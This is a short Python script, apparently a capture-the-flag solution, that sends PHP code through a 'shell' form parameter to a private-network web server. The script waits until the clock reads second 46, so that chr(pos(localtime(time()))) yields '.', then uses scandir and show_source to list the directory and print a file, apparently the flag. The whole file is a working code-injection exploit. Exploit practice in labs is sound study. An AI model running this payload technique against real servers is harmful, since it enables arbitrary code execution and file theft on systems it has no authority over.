import time

import requests

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
           'Content-Type': 'application/x-www-form-urlencoded',
           'Connection': 'close'}
url = "http://172.16.172.202:8021/"
proxies = {'http': 'http://127.0.0.1:8080'}


def scandir():
    data = {'shell': 'var_dump(scandir(chr(pos(localtime(time())))));'}
    r = requests.post(url=url, headers=headers, data=data)
    print(r.text)


def getflag():
    data = {'shell': 'show_source(end(scandir(chr(pos(localtime(time()))))));'}
    r = requests.post(url=url, headers=headers, data=data)
    print(r.text)


if __name__ == '__main__':
    while 1:
        if time.strftime("%S", time.localtime()) == str(ord('.')):
            # scandir()
            getflag()
            break
